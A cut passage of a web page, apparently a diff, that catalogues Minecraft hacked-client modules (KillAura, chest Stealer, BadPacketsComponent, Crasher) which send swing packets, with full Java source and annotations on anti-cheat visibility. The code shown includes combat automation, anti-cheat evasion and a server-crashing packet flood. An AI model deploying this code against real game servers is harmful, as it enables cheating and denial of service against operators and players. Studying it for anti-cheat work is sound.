+	                        if (mc.getNetHandler().getPlayerInfo(((EntityPlayer)target).getUniqueID()).responseTime &gt; 1) {
+	                        	Command.sendPrivateChatMessage("A watchdog bot was removed from your game");
+	                        	mc.theWorld.removeEntity(target);
+	                        	return;
+	                        }
+						} catch (NullPointerException e1) {
+							e1.printStackTrace();
+						}
+						
+					}
+					
+					if (targetingMode.is("Switch")) {
+						
+						if (lastTarget != null &amp;&amp; targets.contains(lastTarget)) {
+							target = lastTarget;
+							if (targetSwitchTimer.hasTimeElapsed((long) (switchTime.getValue()*1000), true)) {
+								target = targets.get(0);
+							}
+							
+						}
+						
+					}
+					
+					if (target != lastTarget) {
+						/*
+						Command.sendPrivateChatMessage("F: " + target.getDisplayName().getFormattedText());
+						Command.sendPrivateChatMessage("U: " + target.getDisplayName().getUnformattedText());
+						Command.sendPrivateChatMessage("UC: " + target.getDisplayName().getUnformattedTextForChat());
+						Command.sendPrivateChatMessage("C: " + target.getCustomNameTag());
+						
+						if (target instanceof EntityPlayer) {
+							
+							Command.sendPrivateChatMessage("Ping: " + mc.getNetHandler().getPlayerInfo(((EntityPlayer)target).getUniqueID()).responseTime);
+							
+						}
+						*/
+					}
+					
+					// if (mc.netHandler.getPlayerInfo(entity.asEntityPlayer().uniqueID)?.responseTime == 0)
+	                // return true
+					
+					lastTarget = target;
+					
+					// This mostly removes a bug which would cause you get get kicked for invalid player movement
+					if (target.posX == mc.thePlayer.posX &amp;&amp; target.posY == mc.thePlayer.posY &amp;&amp; target.posZ == mc.thePlayer.posZ) {
+						
+					}else {
+						
+						if (rotationSetting.is("lock") || rotationSetting.getMode() == "lock") {
+							
+							//event.setYaw(getRotations(target)[0]+10);
+							//event.setPitch(RotationUtils.getRotations(target)[1]);
+							
+                            float[] rotations = RotationUtils.getRotations(target);
+                            event.setYaw(rotations[0]);
+                            event.setYaw(rotations[0] - 2);
+                            
+                            if (event.pitch &lt; -90) {
+                            	event.setPitch(-90);
+                            }
+                            
+                            
+                            upAndDownPitch += 2 + new Random().nextDouble();
+                            
+                            if (upAndDownPitch &gt;= 20) {
+								upAndDownPitch = 0;
+								event.setPitch(rotations[1] - upAndDownPitch);
+							}
+                            else if (upAndDownPitch &gt;= 10) {
+                            	event.setPitch(rotations[1] + 10 - (upAndDownPitch - 10));
+                            }
+                            else {
+                            	event.setPitch(rotations[1] - upAndDownPitch);
+                            }
+                            
+                            if (event.pitch &lt; -90) {
+                            	event.setPitch(-90);
+                            }
+                            
+                            
+                            //Command.sendPrivateChatMessage(aacB);
+                            
+						}
+						else if (rotationSetting.is("smooth") || rotationSetting.getMode() == "smooth") {
+							
+                    		upAndDownPitch/=2;
+                    		customRots(event, target);
+                    		
+							/*
+							try {
+								getSmoothRotations(event);
+							} catch (NullPointerException e2) {
+								
+								this.lastSmoothPitch = event.getPitch();
+								this.lastSmoothYaw = event.getYaw();
+								
+								try {
+									getSmoothRotations(event);
+								} catch (NullPointerException e3) {
+									return;
+								}
+								
+							}
+							*/
+							
+						}
+						
+						// Put client side rotation code here later
+						
+					}
+					
+					Random random = new Random();
+					
+					startBlocking();
+					
+					if (hitOnHurtTime.isEnabled()) {
+						if (target.hurtTime &gt; 2) {
+							return;
+						}
+					}
+					
+					if (timer.hasTimeElapsed((long) (1000/(aps.getValue() + new Random().nextFloat())), true)) {
+						
+						if (s.toggled) {
+							mc.thePlayer.setSprinting(true);
+						}
+						
+						stopBlocking();
+						
+						if (noSwing.enabled) {
+							mc.thePlayer.sendQueue.addToSendQueue(new C0APacketAnimation());
+						}else {
+							mc.thePlayer.swingItem();
+						}
+						
+                        mc.thePlayer.sendQueue.addToSendQueue(new C02PacketUseEntity(target, C02PacketUseEntity.Action.ATTACK));
+                        
+                        float sharpLevel = EnchantmentHelper.func_152377_a(mc.thePlayer.inventory.getCurrentItem(), target.getCreatureAttribute());
+                        if (sharpLevel &gt; 0.0F) {
+                            mc.thePlayer.onEnchantmentCritical(target);
+                        }
+                        
+                        if (SpicyClient.config.criticals.isEnabled() &amp;&amp; mc.thePlayer.onGround) {
+                        	
+                        	mc.thePlayer.onCriticalHit(target);
+                        	
+                        }
+                        
+						if (s.toggled) {
+							mc.thePlayer.setSprinting(true);
+						}
+						if (newAutoblock.is("Hypixel") &amp;&amp; !blocking) {
+							
+							blockHypixel(target);
+							
+							//startBlocking(true);
+							//Random r = new Random();
+							//mc.thePlayer.sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(new BlockPos(-0.410153517, -0.4083644, -0.4186343), 255, mc.thePlayer.getHeldItem(), 0, 0, 0));
+						}
+						
+						//if (dynamicAPSTimer.hasTimeElapsed(10000 + (new Random().nextInt(10) * 1000), true) &amp;&amp; mc.getCurrentServerData().serverIP.toLowerCase().contains("hypixel")) {
+							//Command.sendPrivateChatMessage("Packet sent");
+							//mc.getNetHandler().getNetworkManager().sendPacketNoEvent(new C03PacketPlayer.C05PacketPlayerLook(0, 0, MovementUtils.isOnGround(0.000001)));
+						//}
+						
+					}
+					
+				}else {
+					
+					healthBar = new ScaledResolution(mc).getScaledWidth() / 2 - 41;
+					stopBlocking();
+					RenderUtils.resetPlayerYaw();
+					RenderUtils.resetPlayerPitch();
+					
+		            return;
+		            
+				}
+				
+			}
+			
+		}
+		
+	}
+	
+	private void blockHypixel(EntityLivingBase ent) {
+		
+		if (ent == null) {
+			return;
+		}
+		
+		sendUseItem(mc.thePlayer, mc.theWorld, mc.thePlayer.getCurrentEquippedItem());
+		
+		float[] rotations = RotationUtils.getRotations(target);
+		mc.getNetHandler().getNetworkManager().sendPacketNoEvent(new C02PacketUseEntity(ent, RotationUtils.getVectorForRotation(rotations[0], rotations[1])));
+		mc.getNetHandler().getNetworkManager().sendPacketNoEvent(new C02PacketUseEntity(ent, Action.INTERACT));
+		mc.getNetHandler().getNetworkManager().sendPacketNoEvent(new C08PacketPlayerBlockPlacement(new BlockPos(-1, -1, -1), 255, mc.thePlayer.getHeldItem(), 0, 0, 0));
+		
+	}
+	
+    public boolean sendUseItem(EntityPlayer playerIn, World worldIn, ItemStack itemStackIn)
+    {
+        if (mc.playerController.currentGameType == WorldSettings.GameType.SPECTATOR)
+        {
+            return false;
+        }
+        else
+        {
+        	
+        	if (itemStackIn == null) {
+        		return false;
+        	}
+        	
+            mc.playerController.syncCurrentPlayItem();
+            int i = itemStackIn.stackSize;
+            ItemStack itemstack = itemStackIn.useItemRightClick(worldIn, playerIn);
+
+            if (itemstack != itemStackIn || itemstack != null &amp;&amp; itemstack.stackSize != i)
+            {
+                playerIn.inventory.mainInventory[playerIn.inventory.currentItem] = itemstack;
+
+                if (itemstack.stackSize == 0)
+                {
+                    playerIn.inventory.mainInventory[playerIn.inventory.currentItem] = null;
+                }
+
+                return true;
+            }
+            else
+            {
+                return false;
+            }
+        }
+    }
+    
+	private void stopBlocking() {
+		
+		try {
+			if (blocking &amp;&amp; newAutoblock.is("Hypixel") &amp;&amp; mc.thePlayer.inventory.getCurrentItem().getItem() != null &amp;&amp; mc.thePlayer.inventory.getCurrentItem().getItem() instanceof ItemSword) {
+	        	
+	        	mc.thePlayer.sendQueue.addToSendQueue(new C07PacketPlayerDigging(C07PacketPlayerDigging.Action.RELEASE_USE_ITEM, BlockPos.ORIGIN, EnumFacing.DOWN));
+	            mc.gameSettings.keyBindUseItem.pressed = false;
+	            
+	        }
+		} catch (NullPointerException e) {
+			blocking = false;
+		}
+        
+        blocking = false;
+        
+		return;
+		
+	}
+	
+	private int interactBlock = 0;
+	
+	private void startBlocking() {
+		
+		if(newAutoblock.getMode() == "None") {
+			return;
+		}
+		
+		if (blocking) {
+			if ((mc.thePlayer.inventory.getCurrentItem() != null) &amp;&amp; ((mc.thePlayer.inventory.getCurrentItem().getItem() instanceof ItemSword))) {
+				sendUseItem(mc.thePlayer, mc.theWorld, mc.thePlayer.getCurrentEquippedItem());
+			}
+			
+			return;
+		}
+		
+		blocking = true;
+		
+        if (newAutoblock.is("Hypixel") &amp;&amp; (mc.thePlayer.inventory.getCurrentItem() != null) &amp;&amp; ((mc.thePlayer.inventory.getCurrentItem().getItem() instanceof ItemSword))) {
+        	
+        	blockHypixel(target);
+        	
+        	/*
+        	if (target != null &amp;&amp; interactAutoblock) {
+        		//mc.thePlayer.sendQueue.addToSendQueue(new C02PacketUseEntity(target, new Vec3(randomNumber(-50, 50) / 100.0, randomNumber(0, 200) / 100.0, randomNumber(-50, 50) / 100.0)));
+        		mc.thePlayer.sendQueue.addToSendQueue(new C02PacketUseEntity(target, C02PacketUseEntity.Action.INTERACT));
+        		mc.thePlayer.sendQueue.addToSendQueue(new C02PacketUseEntity(target, C02PacketUseEntity.Action.INTERACT));
+        		mc.thePlayer.sendQueue.addToSendQueue(new C02PacketUseEntity(target, C02PacketUseEntity.Action.INTERACT));
+        		mc.thePlayer.sendQueue.addToSendQueue(new C02PacketUseEntity(target, C02PacketUseEntity.Action.INTERACT));
+        	}
+        	
+        	mc.thePlayer.sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(getHypixelBlockpos(mc.getSession().getUsername()), 255, mc.thePlayer.inventory.getCurrentItem(), 0.0f, 0.0f, 0.0f));
+        	//mc.thePlayer.sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(mc.thePlayer.inventory.getCurrentItem()));
+        	
+        	mc.thePlayer.setItemInUse(mc.thePlayer.getCurrentEquippedItem(), 10);
+        	//mc.gameSettings.keyBindUseItem.pressed = true;
+        	//mc.playerController.sendUseItem(mc.thePlayer, mc.theWorld, mc.thePlayer.getCurrentEquippedItem());
+            //mc.playerController.sendUseItem(mc.thePlayer, mc.theWorld, mc.thePlayer.inventory.getCurrentItem());
+             * 
+             */
+        }
+        else if (newAutoblock.is("Vanilla") &amp;&amp; (mc.thePlayer.inventory.getCurrentItem() != null) &amp;&amp; ((mc.thePlayer.inventory.getCurrentItem().getItem() instanceof ItemSword))) {
+            mc.playerController.sendUseItem(mc.thePlayer, mc.theWorld, mc.thePlayer.inventory.getCurrentItem());
+        }
+        
+	}
+	
+	// I found these methods on github somewhere
+    public static int randomNumber(final int max, final int min) {
+        return Math.round(min + (float)Math.random() * (max - min));
+    }
+    
+    private int randomNumber() {
+        return -1 + (int) (Math.random() * ((1 - (-1)) + 1));
+    }
+    
+    public float[] getCustomRotsChange(float yaw, float pitch, double x, double y, double z){
+    	
+        double xDiff = x - mc.thePlayer.posX;
+        double zDiff = z - mc.thePlayer.posZ;
+        double yDiff = y - mc.thePlayer.posY;
+        
+        double dist = MathHelper.sqrt_double(xDiff * xDiff + zDiff * zDiff);
+    	double mult =  (1/(dist+0.0001)) * 2;
+    	if(mult &gt; 0.2)
+    		mult = 0.2;
+    	if(!mc.theWorld.getEntitiesWithinAABBExcludingEntity(mc.thePlayer, mc.thePlayer.boundingBox).contains(target)){
+        	x += 0.3 * randoms[0];
+        	y -= 0.4 + mult * randoms[1];
+        	z += 0.3 * randoms[2];
+    	}
+    	xDiff = x - mc.thePlayer.posX;
+        zDiff = z - mc.thePlayer.posZ;
+        yDiff = y - mc.thePlayer.posY;
+        float yawToEntity = (float) (Math.atan2(zDiff, xDiff) * 180.0D / 3.141592653589793D) - 90.0F;
+        float pitchToEntity = (float) -(Math.atan2(yDiff, dist) * 180.0D / 3.141592653589793D);
+        return new float[]{MathHelper.wrapAngleTo180_float(-(yaw- (float) yawToEntity)), -MathHelper.wrapAngleTo180_float(pitch - (float) pitchToEntity) - 2.5F};
+    }
+    
+    public void customRots(EventMotion em, EntityLivingBase ent) {
+    	
+        if (target == null) {
+        	
+        	lastSmoothYaw = mc.thePlayer.rotationYaw;
+        	lastSmoothPitch = mc.thePlayer.rotationPitch;
+        	
+        	return;
+        	
+        }
+        
+        float speed = 180;
+        
+        float sYaw = (float) updateRotation((float) lastSmoothYaw, (float) RotationUtils.getRotations(target)[0], speed);
+		float sPitch = (float) updateRotation((float) lastSmoothPitch, (float) RotationUtils.getRotations(target)[1], speed);
+		
+		//Command.sendPrivateChatMessage("Old: " + sYaw + " : " + sPitch);
+		
+		//double move = 5;
+		//move = new Random().nextInt(3) + 1;
+		
+		//move += new Random().nextDouble();
+        //sYaw = (float) updateRotation((float) lastSmoothYaw, (float) RotationUtils.getRotations(target)[0], (float)((lastSmoothYaw - RotationUtils.getRotations(target)[0]) / move));
+		//sPitch = (float) updateRotation((float) lastSmoothPitch, (float) RotationUtils.getRotations(target)[1], (float)((lastSmoothPitch - RotationUtils.getRotations(target)[1]) / move));
+		
+		//Command.sendPrivateChatMessage("New: " + sYaw + " : " + sPitch);
+		
+		lastSmoothYaw = updateRotation(lastSmoothYaw, sYaw, 360);
+		//lastSmoothYaw = sYaw;
+		lastSmoothPitch = updateRotation(lastSmoothPitch, sPitch, 360);
+		
+        if(lastSmoothPitch &gt; 90) {
+        	lastSmoothPitch = 90;
+        } else if (lastSmoothPitch &lt; -90) {
+        	lastSmoothPitch = -90;
+        }
+        
+        //Command.sendPrivateChatMessage("Done: " + sYaw + " : " + sPitch);
+        //Command.sendPrivateChatMessage("Current: " + sYaw + " : " + sPitch);
+        //Command.sendPrivateChatMessage("Intended: " + RotationUtils.getRotations(target)[0] + " : " + RotationUtils.getRotations(target)[1]);
+        //Command.sendPrivateChatMessage(" ");
+        
+        em.setYaw(lastSmoothYaw);
+        em.setPitch(lastSmoothPitch);
+        
+    }
+    
+	public static float updateRotation(float current, float intended, float factor) {
+		float var4 = MathHelper.wrapAngleTo180_float(intended - current);
+
+		if (var4 &gt; factor) {
+			var4 = factor;
+		}
+
+		if (var4 &lt; -factor) {
+			var4 = -factor;
+		}
+
+		return current + var4;
+	}
+    
+}
+// NOTE (AI): Spicy shows the cleanest client/server swing split: noSwing mode pushes C0APacketAnimation so the server sees the swing while the local arm stays still. Rise 5.99's Aura instead sends C0A as an extra swing when the raytrace misses, and Rise 6.x KillAura only watches C0A on the send event to drive its swing state.</code></div><button class="code-expand-btn" onclick="var w=this.parentNode;w.classList.toggle('collapsed');w.classList.toggle('expanded');this.querySelector('.expand-label').textContent=w.classList.contains('collapsed')?'Show more':'Show less'"><svg class="expand-icon-collapsed" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg><svg class="expand-icon-expanded" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="18 15 12 9 6 15"/></svg><span class="expand-label">Show more</span></button></div>
+<div class="impl-meta"><span><strong>Vanilla hook:</strong> Attack timer in an update event; C0A is constructed directly, never via swingItem().</span></div>
+<div class="impl-meta" style="color:var(--orange);margin-top:4px"><span>Swinging without a matching attack is legal (air swings), so the noSwing swap is low risk. The Rise 5.99 alwaysSwing variant adds swings at out-of-range targets, which inflates swing rate and can trip rate heuristics.</span></div>
+<div class="impl-meta" style="margin-top:4px"><span><strong>Variations:</strong> Rise 5.99 implements it as Aura with an alwaysSwing setting. Rise 6.x KillAura consumes C0A as a state signal. Sigma's Killaura imports C0A but its corpus hit is import-only. Spicy's memes modules (CsgoSpinbot, YawAndPitchSpoof and friends) match C0A in packet events to replay or rotate around swings.</span></div>
 </div>
+<div class="impl-module-entry"><div class="impl-module-header"><span class="impl-module-name">Stealer</span>
+<span class="impl-module-clients">(Memeware 7.3, Nekoware v1 private)</span>
 </div>
+<p class="impl-pattern">Chest stealing. Sends C0A before the right-click that opens a nearby chest, mimicking an interaction swing.</p>
+<p class="impl-pattern" style="font-size:0.8rem;color:var(--text-muted)">Nearby mode scans a 3-block radius each delay tick; for every chest not yet emptied, PacketUtil.sendPacket(new C0APacketAnimation()) fires, then onPlayerRightClick opens it. Emptied positions are cleared on S08PacketPlayerPosLook and on enable.</p>
+<p class="impl-meta" style="font-size:0.75rem"><span><strong>Source:</strong> Memeware 7.3 — me/memewaredevs/client/module/player/Stealer.java</span></p>
+<div class="impl-code-wrap collapsed"><div class="impl-code"><code>// ===== FILE: Memeware 7.3 — me/memewaredevs/client/module/player/Stealer.java =====
+package me.memewaredevs.client.module.player;
+
+import me.hippo.api.lwjeb.annotation.Handler;
+import me.memewaredevs.client.event.events.PacketInEvent;
+import me.memewaredevs.client.event.events.UpdateEvent;
+import me.memewaredevs.client.module.Module;
+import me.memewaredevs.client.util.packet.PacketUtil;
+import me.memewaredevs.client.util.blocks.position.Vec3d;
+import net.minecraft.block.Block;
+import net.minecraft.block.BlockChest;
+import net.minecraft.client.gui.inventory.GuiChest;
+import net.minecraft.inventory.Container;
+import net.minecraft.inventory.Slot;
+import net.minecraft.network.play.client.C0APacketAnimation;
+import net.minecraft.network.play.server.S08PacketPlayerPosLook;
+import net.minecraft.util.BlockPos;
+import net.minecraft.util.EnumFacing;
+
+import java.util.ArrayList;
+import java.util.List;
+import java.util.function.Consumer;
+
+import static org.lwjgl.input.Keyboard.KEY_K;
+
+public class Stealer extends Module {
+    public Stealer() {
+        super("Stealer", KEY_K, Category.PLAYER);
+        this.addModes("Normal", "Nearby");
+        this.addBoolean("Close", true);
+        this.addDouble("Delay", 4, 0, 12);
+    }
+    private final List&lt;BlockPos&gt; emptiedChests = new ArrayList();
+
+    @Handler
+    public Consumer&lt;UpdateEvent&gt; eventConsumer0 = event -&gt; {
+        if (mc.currentScreen instanceof GuiChest) {
+            if (!isEmpty(mc.thePlayer.openContainer)) {
+                for (Slot slot : (List&lt;Slot&gt;) mc.thePlayer.openContainer.inventorySlots) {
+                    if (slot != null &amp;&amp; slot.getStack() != null &amp;&amp; mc.thePlayer.ticksExisted % Math.round(this.getDouble("Delay")) == 0) {
+                        mc.playerController.windowClick(mc.thePlayer.openContainer.windowId, slot.slotNumber, 0, 1, mc.thePlayer);
+                        return;
+                    }
+                }
+            } else {
+                if (this.getBool("Close") || isMode("Nearby")) {
+                    mc.displayGuiScreen(null);
+                }
+            }
+            return;
+        }
+        if (isMode("Nearby")) {
+            int maxDist = 3;
+            if (mc.currentScreen == null) {
+                if (mc.thePlayer.ticksExisted % Math.round(this.getDouble("Delay")) == 0) {
+                    for (int y = maxDist; y &gt;= -maxDist; y--) {
+                        for (int x = -maxDist; x &lt; maxDist; x++) {
+                            for (int z = -maxDist; z &lt; maxDist; z++) {
+                                int posX = ((int) Math.floor(mc.thePlayer.posX) + x);
+                                int posY = ((int) Math.floor(mc.thePlayer.posY) + y);
+                                int posZ = ((int) Math.floor(mc.thePlayer.posZ) + z);
+                                if (mc.thePlayer.getDistanceSq(mc.thePlayer.posX + x, mc.thePlayer.posY + y, mc.thePlayer.posZ + z) &lt;= 16.0) {
+                                    Block block = mc.theWorld.getBlockState(new BlockPos(posX, posY, posZ)).getBlock();
+                                    if (block instanceof BlockChest) {
+                                        BlockPos pos = new BlockPos(posX, posY, posZ);
+                                        if (!this.emptiedChests.contains(pos)) {
+                                            this.emptiedChests.add(pos);
+                                            PacketUtil.sendPacket(new C0APacketAnimation());
+                                            mc.playerController.onPlayerRightClick(mc.thePlayer, mc.theWorld, mc.thePlayer.getHeldItem(), new BlockPos(posX, posY, posZ), EnumFacing.DOWN, new Vec3d(mc.thePlayer.posX, mc.thePlayer.posY, mc.thePlayer.posZ));
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    };
+
+    @Handler
+    public Consumer&lt;PacketInEvent&gt; eventConsumer1 = event -&gt; {
+        if (event.getPacket() instanceof S08PacketPlayerPosLook &amp;&amp; mc.getNetHandler() != null &amp;&amp; mc.getNetHandler().doneLoadingTerrain) {
+            emptiedChests.clear();
+        }
+    };
+
+    @Override
+    public void onEnable() {
+        this.emptiedChests.clear();
+    }
+
+    public boolean isEmpty(final Container container) {
+        boolean isEmpty = true;
+        int maxSlot = (container.inventorySlots.size() == 90) ? 54 : 27;
+        for (int i = 0; i &lt; maxSlot; ++i) {
+            if (container.getSlot(i).getHasStack()) {
+                isEmpty = false;
+            }
+        }
+        return isEmpty;
+    }
+
+}
+// NOTE (AI): The swing here is cosmetic: it precedes the open interaction so the server sees the full click sequence. Nekoware's Stealer duplicates the file.</code></div><button class="code-expand-btn" onclick="var w=this.parentNode;w.classList.toggle('collapsed');w.classList.toggle('expanded');this.querySelector('.expand-label').textContent=w.classList.contains('collapsed')?'Show more':'Show less'"><svg class="expand-icon-collapsed" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg><svg class="expand-icon-expanded" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="18 15 12 9 6 15"/></svg><span class="expand-label">Show more</span></button></div>
+<div class="impl-meta"><span><strong>Vanilla hook:</strong> UpdateEvent; swing is sent via PacketUtil.sendPacket before onPlayerRightClick.</span></div>
+<div class="impl-meta" style="color:var(--orange);margin-top:4px"><span>Invisible to anti-cheats; interaction order (swing then use) is exactly what a player produces.</span></div>
+<div class="impl-meta" style="margin-top:4px"><span><strong>Variations:</strong> Nekoware v1 private ships the same module with the same C0A send.</span></div>
+</div>
+<div class="impl-module-entry"><div class="impl-module-header"><span class="impl-module-name">BadPacketsComponent</span>
+<span class="impl-module-clients">(Rise 6.2.4, Rise 6.1.30)</span>
+</div>
+<p class="impl-pattern">A shared state tracker, not a user module: flags swing=true on any outgoing C0A and resets all flags on the next C03PacketPlayer. Other modules call BadPacketsComponent.bad() to decide whether spoofed packets are safe to send.</p>
+<p class="impl-pattern" style="font-size:0.8rem;color:var(--text-muted)">PacketSendEvent at VERY_HIGH priority sets one boolean per packet family: slot (C09), swing (C0A), attack (C02), block (C08/C07), inventory (C0E/C16 OPEN_INVENTORY/C0D). C03PacketPlayer clears everything. Modules gate spoofed sends on bad() so they never fire mid-sequence.</p>
+<p class="impl-meta" style="font-size:0.75rem"><span><strong>Source:</strong> Rise 6.2.4 — Client-release2/Client/src/main/java/com/alan/clients/component/impl/player/BadPacketsComponent.java</span></p>
+<div class="impl-code-wrap collapsed"><div class="impl-code"><code>// ===== FILE: Rise 6.2.4 — Client-release2/Client/src/main/java/com/alan/clients/component/impl/player/BadPacketsComponent.java =====
+package com.alan.clients.component.impl.player;
+
+import com.alan.clients.component.Component;
+import com.alan.clients.event.Listener;
+import com.alan.clients.event.Priorities;
+import com.alan.clients.event.annotations.EventLink;
+import com.alan.clients.event.impl.packet.PacketSendEvent;
+import net.minecraft.network.Packet;
+import net.minecraft.network.play.client.*;
+
+import static net.minecraft.network.play.client.C16PacketClientStatus.EnumState.OPEN_INVENTORY_ACHIEVEMENT;
+
+public final class BadPacketsComponent extends Component {
+
+    private static boolean slot, attack, swing, block, inventory;
+
+    public static boolean bad() {
+        return bad(true, true, true, true, true);
+    }
+
+    public static boolean bad(final boolean slot, final boolean attack, final boolean swing, final boolean block, final boolean inventory) {
+        return (BadPacketsComponent.slot &amp;&amp; slot) ||
+                (BadPacketsComponent.attack &amp;&amp; attack) ||
+                (BadPacketsComponent.swing &amp;&amp; swing) ||
+                (BadPacketsComponent.block &amp;&amp; block) ||
+                (BadPacketsComponent.inventory &amp;&amp; inventory);
+    }
+
+    @EventLink(value = Priorities.VERY_HIGH)
+    public final Listener&lt;PacketSendEvent&gt; onPacketSend = event -&gt; {
+        final Packet&lt;?&gt; packet = event.getPacket();
+
+        if (packet instanceof C09PacketHeldItemChange) {
+            slot = true;
+        } else if (packet instanceof C0APacketAnimation) {
+            swing = true;
+        } else if (packet instanceof C02PacketUseEntity) {
+            attack = true;
+//            if (block) ChatUtil.display("BadPackets");
+        } else if (packet instanceof C08PacketPlayerBlockPlacement || packet instanceof C07PacketPlayerDigging) {
+            block = true;
+//            if (attack) ChatUtil.display("BadPackets");
+        } else if (packet instanceof C0EPacketClickWindow ||
+                (packet instanceof C16PacketClientStatus &amp;&amp; ((C16PacketClientStatus) packet).getStatus() == OPEN_INVENTORY_ACHIEVEMENT) ||
+                packet instanceof C0DPacketCloseWindow) {
+            inventory = true;
+        } else if (packet instanceof C03PacketPlayer) {
+            reset();
+        }
+    };
+
+    public static void reset() {
+        slot = false;
+        swing = false;
+        attack = false;
+        block = false;
+        inventory = false;
+    }
+}
+// NOTE (AI): C0A is one of five flags. The component exists so velocity and disabler modes can check that no swing, click or attack is in flight before injecting packets, which is exactly what GrimReduceVelocity and WatchdogDisabler do.</code></div><button class="code-expand-btn" onclick="var w=this.parentNode;w.classList.toggle('collapsed');w.classList.toggle('expanded');this.querySelector('.expand-label').textContent=w.classList.contains('collapsed')?'Show more':'Show less'"><svg class="expand-icon-collapsed" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg><svg class="expand-icon-expanded" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="18 15 12 9 6 15"/></svg><span class="expand-label">Show more</span></button></div>
+<div class="impl-meta"><span><strong>Vanilla hook:</strong> PacketSendEvent (VERY_HIGH priority); reset on C03PacketPlayer.</span></div>
+<div class="impl-meta" style="color:var(--orange);margin-top:4px"><span>The component is defensive: it prevents the client from emitting overlapping action packets that anti-cheats read as impossible sequences.</span></div>
+<div class="impl-meta" style="margin-top:4px"><span><strong>Variations:</strong> Identical in Rise 6.1.30 and 6.2.4. It is also the gate for the C0D close in WatchdogDisabler and the C0A send in GrimReduceVelocity.</span></div>
+</div>
+<div class="impl-module-entry"><div class="impl-module-header"><span class="impl-module-name">Crasher</span>
+<span class="impl-module-clients">(Tenacity 6.0)</span>
+</div>
+<p class="impl-pattern">Lag or kill the server by flooding zero-payload swings, exploiting the server's per-packet broadcast cost.</p>
+<p class="impl-pattern" style="font-size:0.8rem;color:var(--text-muted)">On every MotionEvent, loop 2000 iterations (Vanilla mode) or 10000 (Boom mode) pushing new C0APacketAnimation() into the send queue in a single tick.</p>
+<p class="impl-meta" style="font-size:0.75rem"><span><strong>Source:</strong> Tenacity 6.0 — dev/tenacity/module/impl/exploit/Crasher.java</span></p>
+<div class="impl-code-wrap collapsed"><div class="impl-code"><code>// ===== FILE: Tenacity 6.0 — dev/tenacity/module/impl/exploit/Crasher.java =====
+package dev.tenacity.module.impl.exploit;
+
+import dev.tenacity.event.IEventListener;
+import dev.tenacity.event.impl.player.MotionEvent;
+import dev.tenacity.module.Module;
+import dev.tenacity.module.ModuleCategory;
+import dev.tenacity.setting.impl.ModeSetting;
+import dev.tenacity.util.misc.ChatUtil;
+import dev.tenacity.util.misc.TimerUtil;
+import io.netty.buffer.Unpooled;
+import net.minecraft.network.PacketBuffer;
+import net.minecraft.network.play.client.C0APacketAnimation;
+import net.minecraft.network.play.client.C17PacketCustomPayload;
+
+import java.nio.charset.StandardCharsets;
+import java.util.concurrent.TimeUnit;
+import java.io.*;
+import java.lang.Thread;
+
+public final class Crasher extends Module {
+
+    private final TimerUtil timerUtil = new TimerUtil();
+
+    private final ModeSetting mode = new ModeSetting("Mode", "Vanilla", "Boom");
+
+    public Crasher() {
+        super("Crasher", "Makes server go kaboom", ModuleCategory.EXPLOIT);
+        initializeSettings(mode);
+    }
+
+    private final IEventListener&lt;MotionEvent&gt; onMotionEvent = event -&gt; {
+        switch(mode.getCurrentMode()) {
+            case "Vanilla": {
+                for (int i = 0; i &lt; 2000; i++) {
+                    mc.thePlayer.sendQueue.addToSendQueue(new C0APacketAnimation());
+                }
+                break;
+            }
+            case "Boom": {
+                for (int i = 0; i &lt; 10000; i++) {
+                    mc.thePlayer.sendQueue.addToSendQueue(new C0APacketAnimation());
+                }
+                break;
+            }
+
+        }
+    };
+}
+// NOTE (AI): Each C0A costs the server a markPlayerActive call, a swingItem call and an S0BPacketAnimation broadcast to every tracker; 10000 per tick is a broadcast storm. The Boom mode name is literal.</code></div><button class="code-expand-btn" onclick="var w=this.parentNode;w.classList.toggle('collapsed');w.classList.toggle('expanded');this.querySelector('.expand-label').textContent=w.classList.contains('collapsed')?'Show more':'Show less'"><svg class="expand-icon-collapsed" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg><svg class="expand-icon-expanded" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="18 15 12 9 6 15"/></svg><span class="expand-label">Show more</span></button></div>
+<div class="impl-meta"><span><strong>Vanilla hook:</strong> MotionEvent; packets are queued via addToSendQueue, not a packet event.</span></div>
+<div class="impl-meta" style="color:var(--orange);margin-top:4px"><span>Trips packet-rate limits instantly on any server with them; this is a grief tool, not a bypass.</span></div>
+<div class="impl-meta" style="margin-top:4px"><span><strong>Variations:</strong> None in the corpus; Tenacity also lists C0A in its PacketUtil as one of the packet types that bypass the send queue filter.</span></div>
+</div>
+<div class="impl-module-entry"><div class="impl-module-header"><span class="impl-module-name">GrimReduceVelocity</span>
+<span class="impl-module-clients">(Rise 6.2.4, Rise 6.1.30)</span>
+</div>
+<p class="impl-pattern">Pair a swing with the velocity-reduction attack so the attack sequence looks legitimate to anti-cheats.</p>
+<p class="impl-pattern" style="font-size:0.8rem;color:var(--text-muted)">On PreUpdateEvent, if within 14 ticks of taking velocity and BadPacketsComponent.bad() is false, send C0APacketAnimation then call playerController.attackEntity on the nearest target. The swing precedes the attack so the server sees a clean swing-attack pair.</p>
+<p class="impl-meta" style="font-size:0.75rem"><span><strong>Source:</strong> Rise 6.2.4 — Client-release2/Client/src/main/java/com/alan/clients/module/impl/combat/velocity/GrimReduceVelocity.java</span></p>
+<div class="impl-code-wrap collapsed"><div class="impl-code"><code>// ===== FILE: Rise 6.2.4 — Client-release2/Client/src/main/java/com/alan/clients/module/impl/combat/velocity/GrimReduceVelocity.java =====
+package com.alan.clients.module.impl.combat.velocity;
+
+import com.alan.clients.component.impl.player.BadPacketsComponent;
+import com.alan.clients.component.impl.player.TargetComponent;
